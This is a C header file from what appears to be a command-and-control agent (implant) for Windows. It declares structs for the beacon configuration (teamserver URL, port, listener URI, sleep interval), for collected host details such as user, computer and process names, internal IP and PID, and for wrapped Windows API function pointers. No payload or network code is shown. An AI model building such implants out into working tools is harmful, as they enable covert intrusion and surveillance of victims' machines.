//
// Created by j4ck on 3/11/24.
//
#include <windows.h>
#include "Win32.h"
#ifndef AGENT_AGENT_H
#define AGENT_AGENT_H

/* Used to store Agent Information. Serialized to JSON in serializer.c */
typedef struct {
    PWCHAR  pUserName;
    DWORD   dwUserNameSize;
    PWCHAR  pComputerName;
    DWORD   dwComputerNameSize;
    PWCHAR  pProcessName;
    PCHAR   pInternalIp;
    DWORD   PID;
    DWORD   WindowsVersion;

} AgentInfo;


typedef struct {
    struct {
        // Agent & Teamserver config goes here.
        PWCHAR      url;
        DWORD       port;
        PCHAR       ListenerUri;
        DWORD       sleep;
        PCHAR       UniqueId;
    } Config;
    struct {
        // Windows / NTAPI API wrappers go here.
        fnGetComputerNameW              GetComputerNameW;
        fnGetUserNameW                  GetUserNameW;
        fnGetCurrentProcess             GetCurrentProcess;
        fnOpenProcess                   OpenProcess;
        fnGetProcessId                  GetProcessId;
        fnGetProcessImageFileNameW      GetProcessImageFileNameW;
        fnGetVersion                    GetVersion;
        fnGetAdaptersAddresses          GetAdaptersAddresses;
        fnGetAdaptersInfo               GetAdaptersInfo;
        fnSleep                         Sleep;
    } Api;
} AGENT_INSTANCE, *PAGENT_INSTANCE;

extern PAGENT_INSTANCE Agent;

#endif //AGENT_AGENT_H
